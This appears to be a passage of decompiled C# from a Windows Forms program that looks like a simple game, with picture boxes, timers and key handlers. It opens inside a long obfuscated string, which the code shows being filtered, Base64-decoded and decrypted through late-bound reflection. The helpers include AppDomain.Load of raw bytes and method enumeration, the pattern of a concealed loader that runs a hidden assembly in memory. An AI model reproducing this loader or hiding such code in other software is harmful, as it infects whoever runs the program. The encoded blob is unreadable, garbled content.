Úî\u00b8\u00b8\u00b8¼Þ\u00b8½\u00b8\u00b8¹\u00b8¼Ä\u00b8Ùî¹ë\u00b8¿\u00b8\u00b8ÐÈ¹ì\u00b8¿â\u00b8ËÞ¹ß\u00b8¾§\u00b8ÑÈ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ÈÞ¹\u00a8\u00b8¾«\u00b8ØÈ¹ä\u00b8¿Ì\u00b8À\u00b8¹Ì\u00b8¾Ì\u00b8Ðî¹æ\u00b8¾«\u00b8Ùî¹ê\u00b8¾\u00af\u00b8Ñî¹ç\u00b8¾Ì\u00b8Úî\u00b8\u00b8\u00b8½î\u00b8¾Þ\u00b8¹\u00b8¼Ð\u00b8ØÈ¹ê\u00b8¾Ì\u00b8É\u00b8¹ã\u00b8¿Ä\u00b8Ðî¹ð\u00b8¾â\u00b8Ú\u00b8¹§\u00b8¾â\u00b8Ùî¹ì\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹º\u00b8¿Ì\u00b8ÙÞ¹ç\u00b8¾Ð\u00b8ÛÈ\u00b8Þ\u00b8¼Ð\u00b8ÚÞ¹ß\u00b8¾§\u00b8ÑÈ¹ª\u00b8¾\u00af\u00b8ÚÞ¹é\u00b8º\u00b8\u00b8ÃÈ\u00b8Þ\u00b8½Ì\u00b8ÊÈ\u00b8Þ\u00b8¼î\u00b8ØÈ¹à\u00b8\u00b8\u00b8\u00b8Ä\u00b8\u00b8À\u00b8\u00b8¼\u00b8ÉÞ¹ç\u00b8¾î\u00b8ÑÈ¹Î\u00b8¾Ì\u00b8ÚÞ¹ñ\u00b8¾â\u00b8Ùî¹ì\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ï\u00b8º«\u00b8Äî\u00b8ì\u00b8»\u00b8\u00b8ÃÞ\u00b8î\u00b8\u00b8\u00b8\u00b8Ç\u00b8\u00b8Æ\u00b8\u00b8¼\u00b8ÊÈ¹ì\u00b8¿È\u00b8ÑÈ¹ð\u00b8¾«\u00b8ÐÈ¹ê\u00b8¼«\u00b8ÐÈ¹ë\u00b8¾Ì\u00b8\u00b8\u00b8¹º\u00b8¿Ì\u00b8ÙÞ¹ç\u00b8¾Ð\u00b8ÛÈ\u00b8ì\u00b8½Ì\u00b8ÊÈ\u00b8ì\u00b8¾È\u00b8Ù\u00b8¹ê\u00b8\u00b8\u00b8\u00b8Ê\u00b8\u00b8Ê\u00b8\u00b8¼\u00b8Ë\u00b8¹ã\u00b8¾Ú\u00b8ÐÈ¹ê\u00b8¼Ä\u00b8Ùî¹î\u00b8¿â\u00b8ÚÞ¹ç\u00b8¾Ú\u00b8Ø\u00b8¹§\u00b8\u00b8\u00b8\u00b8Èî¹í\u00b8¿\u00b8\u00b8ÜÈ¹ð\u00b8¾â\u00b8Ñî¹æ\u00b8¿È\u00b8À\u00b8ºç\u00b8º\u00b8\u00b8À\u00b8\u00b8ð\u00b8»\u00b8\u00b8ÄÈ\u00b8©\u00b8\u00b8\u00b8\u00b8ÂÞ\u00b8¹\u00b8\u00b8¼\u00b8Ë\u00b8¹ã\u00b8¾Ú\u00b8ÐÈ¹ê\u00b8½È\u00b8ÚÞ¹ß\u00b8¾È\u00b8ÑÈ¹ë\u00b8¾¼\u00b8ÚÞ¹é\u00b8¿Ä\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹¼\u00b8\u00b8«\u00b8\u00b8È¹Ç\u00b8¿À\u00b8ØÈ¹å\u00b8¾â\u00b8ÙÞ¹ß\u00b8¾î\u00b8ÉÞ¹ç\u00b8¾î\u00b8ÑÈ¹ì\u00b8¾¼\u00b8ÙÈ¹ã\u00b8\u00b8\u00b8\u00b8ÈÞ¹\u00a8\u00b8¾«\u00b8ØÈ¹ä\u00b8¿Ì\u00b8ÃÞ¹Í\u00b8¼â\u00b8ÃÞ¹â\u00b8¾î\u00b8Ù\u00b8\u00b8\u00b8\u00b8»È\u00b8ºÞ\u00b8¹\u00b8½\u00b8\u00b8ÚÞ¹í\u00b8¾È\u00b8ÛÈ¹á\u00b8¿È\u00b8ËÞ¹ß\u00b8¾§\u00b8ÑÈ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8ÈÞ¹\u00a8\u00b8¾«\u00b8ØÈ¹ä\u00b8¿Ì\u00b8À\u00b8¹Í\u00b8¼â\u00b8\u00b8\u00b8\u00b8§\u00b8\u00b8Þ\u00b8\u00b8È¹È\u00b8¿À\u00b8Ùî¹â\u00b8¿Ì\u00b8Ðî¹§\u00b8½Ð\u00b8ÑÈ¹ð\u00b8¿Ä\u00b8ØÈ¹í\u00b8¾«\u00b8\u00b8\u00b8\u00b8ï\u00b8º«\u00b8Äî\u00b8ì\u00b8»\u00b8\u00b8ÃÞ\u00b8î\u00b8\u00b8\u00b8\u00b8Æ\u00b8\u00b8À\u00b8\u00b8¼\u00b8ÈÈ¹ñ\u00b8¿Ä\u00b8ÑÈ¹ë\u00b8¾À\u00b8Ù\u00b8¹¬\u00b8º\u00b8\u00b8ÍÞ¹ã\u00b8¿À\u00b8Úî¹ç\u00b8¾\u00af\u00b8ÙÞ\u00b8\u00b8\u00b8»¼\u00b8ÃÞ\u00b8ñ\u00b8º«\u00b8Ä\u00b8\u00b8ì\u00b8»\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8¹È\u00b8\u00b8\u00b8Ä\u00b8\u00b8\u00b8\u00b8¼»Þ\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8\u00b8";
		object obj = GForm2.smethod_107(smethod_5(GForm2.smethod_106(GForm2.smethod_26(smethod_3(string_, "wwwwwwwww"), (Type)null, "ToCharArray", new object[0], (string[])null, (Type[])null, (bool[])null))));
		object object_ = GForm2.smethod_107(smethod_2((byte[])obj, bool_1: true));
		smethod_6(GForm2.smethod_107(object_));
		return GForm2.smethod_106(obj);
	}

	private static object smethod_5(string string_0)
	{
		return GForm2.smethod_98((object)GForm2.smethod_44(typeof(Convert).TypeHandle), (Type)null, "InvokeMember", new object[5]
		{
			"FromBase64String",
			256,
			null,
			null,
			new object[1] { string_0 }
		}, (string[])null, (bool[])null);
	}

	public static object smethod_6(object object_1)
	{
		smethod_1(GForm2.smethod_107(object_1));
		object result = default(object);
		return result;
	}

	static void smethod_7(Form form_0, FormClosedEventHandler formClosedEventHandler_0)
	{
		form_0.add_FormClosed(formClosedEventHandler_0);
	}

	static void smethod_8(Control control_0, KeyEventHandler keyEventHandler_0)
	{
		control_0.add_KeyDown(keyEventHandler_0);
	}

	static void smethod_9(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseClick(mouseEventHandler_0);
	}

	static void smethod_10(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_11(Control control_0, bool bool_1)
	{
		control_0.set_Enabled(bool_1);
	}

	static void smethod_12(Control control_0, int int_6)
	{
		control_0.set_Left(int_6);
	}

	static int smethod_13(Control control_0)
	{
		return control_0.get_Left();
	}

	static void smethod_14(Control control_0)
	{
		control_0.Show();
	}

	static void smethod_15(Control control_0, int int_6)
	{
		control_0.set_Top(int_6);
	}

	static void smethod_16(Timer timer_4, bool bool_1)
	{
		timer_4.set_Enabled(bool_1);
	}

	static void smethod_17(ToolStripItem toolStripItem_0, string string_0)
	{
		toolStripItem_0.set_Text(string_0);
	}

	static Keys smethod_18(KeyEventArgs keyEventArgs_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return keyEventArgs_0.get_KeyCode();
	}

	static bool smethod_19(Timer timer_4)
	{
		return timer_4.get_Enabled();
	}

	static void smethod_20(Control control_0)
	{
		control_0.Hide();
	}

	static int smethod_21(Control control_0)
	{
		return control_0.get_Right();
	}

	static int smethod_22(Control control_0)
	{
		return control_0.get_Top();
	}

	static float smethod_23()
	{
		return VBMath.Rnd();
	}

	static double smethod_24(double double_0)
	{
		return Math.Round(double_0);
	}

	static int smethod_25(Control control_0)
	{
		return control_0.get_Height();
	}

	static object smethod_26(object object_1, Type type_0, string string_0, object[] object_2, string[] string_1, Type[] type_1, bool[] bool_1)
	{
		return NewLateBinding.LateGet(object_1, type_0, string_0, object_2, string_1, type_1, bool_1);
	}

	static object smethod_27(object object_1, object object_2, bool bool_1)
	{
		return Operators.CompareObjectGreaterEqual(object_1, object_2, bool_1);
	}

	static object smethod_28(object object_1, object object_2)
	{
		return Operators.AddObject(object_1, object_2);
	}

	static object smethod_29(object object_1, object object_2)
	{
		return Operators.AndObject(object_1, object_2);
	}

	static int smethod_30(Control control_0)
	{
		return control_0.get_Width();
	}

	static bool smethod_31(Control control_0)
	{
		return control_0.get_Visible();
	}

	static object smethod_32(object object_1, object object_2, bool bool_1)
	{
		return Operators.CompareObjectEqual(object_1, object_2, bool_1);
	}

	static bool smethod_33(object object_1)
	{
		return Conversions.ToBoolean(object_1);
	}

	static string smethod_34(int int_6)
	{
		return Conversions.ToString(int_6);
	}

	static string smethod_35(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static DialogResult smethod_36(string string_0, string string_1, MessageBoxButtons messageBoxButtons_0, MessageBoxIcon messageBoxIcon_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show(string_0, string_1, messageBoxButtons_0, messageBoxIcon_0);
	}

	static bool smethod_37(object object_1, object object_2, bool bool_1)
	{
		return Operators.ConditionalCompareObjectEqual(object_1, object_2, bool_1);
	}

	static Point smethod_38(Control control_0)
	{
		return control_0.get_Location();
	}

	static object smethod_39(object object_1, object object_2, bool bool_1)
	{
		return Operators.CompareObjectLessEqual(object_1, object_2, bool_1);
	}

	static Image smethod_40(PictureBox pictureBox_8)
	{
		return pictureBox_8.get_Image();
	}

	static void smethod_41(Image image_0, RotateFlipType rotateFlipType_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		image_0.RotateFlip(rotateFlipType_0);
	}

	static void smethod_42(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_43()
	{
		return new Container();
	}

	static Type smethod_44(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static ComponentResourceManager smethod_45(Type type_0)
	{
		return new ComponentResourceManager(type_0);
	}

	static Timer smethod_46(IContainer icontainer_1)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_1);
	}

	static PictureBox smethod_47()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static Label smethod_48()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static StatusStrip smethod_49()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new StatusStrip();
	}

	static ToolStripStatusLabel smethod_50()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ToolStripStatusLabel();
	}

	static void smethod_51(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_52(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_53(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_54(Timer timer_4, int int_6)
	{
		timer_4.set_Interval(int_6);
	}

	static void smethod_55(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_56(Control control_0, ImageLayout imageLayout_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_BackgroundImageLayout(imageLayout_0);
	}

	static void smethod_57(PictureBox pictureBox_8, Image image_0)
	{
		pictureBox_8.set_InitialImage(image_0);
	}

	static void smethod_58(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_59(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_60(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_61(PictureBox pictureBox_8, PictureBoxSizeMode pictureBoxSizeMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_8.set_SizeMode(pictureBoxSizeMode_0);
	}

	static void smethod_62(PictureBox pictureBox_8, int int_6)
	{
		pictureBox_8.set_TabIndex(int_6);
	}

	static void smethod_63(PictureBox pictureBox_8, bool bool_1)
	{
		pictureBox_8.set_TabStop(bool_1);
	}

	static object smethod_64(ResourceManager resourceManager_0, string string_0)
	{
		return resourceManager_0.GetObject(string_0);
	}

	static void smethod_65(Control control_0, Image image_0)
	{
		control_0.set_BackgroundImage(image_0);
	}

	static Font smethod_66(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_67(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_68(Control control_0, Color color_0)
	{
		control_0.set_ForeColor(color_0);
	}

	static void smethod_69(Control control_0, int int_6)
	{
		control_0.set_TabIndex(int_6);
	}

	static void smethod_70(Control control_0, object object_1)
	{
		control_0.set_Tag(object_1);
	}

	static void smethod_71(Label label_1, string string_0)
	{
		label_1.set_Text(string_0);
	}

	static void smethod_72(ToolStrip toolStrip_0, bool bool_1)
	{
		toolStrip_0.set_AllowMerge(bool_1);
	}

	static void smethod_73(ToolStrip toolStrip_0, bool bool_1)
	{
		toolStrip_0.set_AutoSize(bool_1);
	}

	static ToolStripItemCollection smethod_74(ToolStrip toolStrip_0)
	{
		return toolStrip_0.get_Items();
	}

	static void smethod_75(ToolStripItemCollection toolStripItemCollection_0, ToolStripItem[] toolStripItem_0)
	{
		toolStripItemCollection_0.AddRange(toolStripItem_0);
	}

	static void smethod_76(StatusStrip statusStrip_1, bool bool_1)
	{
		statusStrip_1.set_SizingGrip(bool_1);
	}

	static void smethod_77(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static void smethod_78(ToolStripItem toolStripItem_0, Color color_0)
	{
		toolStripItem_0.set_BackColor(color_0);
	}

	static void smethod_79(ToolStripItem toolStripItem_0, string string_0)
	{
		toolStripItem_0.set_Name(string_0);
	}

	static void smethod_80(ToolStripItem toolStripItem_0, Size size_0)
	{
		toolStripItem_0.set_Size(size_0);
	}

	static void smethod_81(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_82(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_83(Form form_0, AutoSizeMode autoSizeMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_AutoSizeMode(autoSizeMode_0);
	}

	static Color smethod_84()
	{
		return SystemColors.ActiveBorder;
	}

	static void smethod_85(Form form_0, Color color_0)
	{
		form_0.set_BackColor(color_0);
	}

	static void smethod_86(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_87(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_88(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_89(Form form_0, Icon icon_0)
	{
		form_0.set_Icon(icon_0);
	}

	static void smethod_90(Form form_0, bool bool_1)
	{
		form_0.set_MaximizeBox(bool_1);
	}

	static void smethod_91(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_92(Form form_0, string string_0)
	{
		form_0.set_Text(string_0);
	}

	static void smethod_93(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_94(Control control_0, bool bool_1)
	{
		control_0.ResumeLayout(bool_1);
	}

	static void smethod_95(Control control_0)
	{
		control_0.PerformLayout();
	}

	static void smethod_96(Control control_0, bool bool_1)
	{
		control_0.ResumeLayout(bool_1);
	}

	static MethodInfo[] smethod_97(Type type_0)
	{
		return type_0.GetMethods();
	}

	static object smethod_98(object object_1, Type type_0, string string_0, object[] object_2, string[] string_1, bool[] bool_1)
	{
		return LateBinding.LateGet(object_1, type_0, string_0, object_2, string_1, bool_1);
	}

	static Type[] smethod_99(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}

	static AppDomain smethod_100()
	{
		return Thread.GetDomain();
	}

	static Assembly smethod_101(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static int smethod_102(string string_0)
	{
		return string_0.Length;
	}

	static char smethod_103(string string_0, int int_6)
	{
		return Strings.GetChar(string_0, int_6);
	}

	static char smethod_104(int int_6)
	{
		return Strings.ChrW(int_6);
	}

	static string smethod_105(char char_0)
	{
		return Conversions.ToString(char_0);
	}

	static string smethod_106(object object_1)
	{
		return Conversions.ToString(object_1);
	}

	static object smethod_107(object object_1)
	{
		return RuntimeHelpers.GetObjectValue(object_1);
	}

	static void smethod_108(Timer timer_4, EventHandler eventHandler_0)
	{
		timer_4.remove_Tick(eventHandler_0);
	}

	static void smethod_109(Timer timer_4, EventHandler eventHandler_0)
	{
		timer_4.add_Tick(eventHandler_0);
	}
}
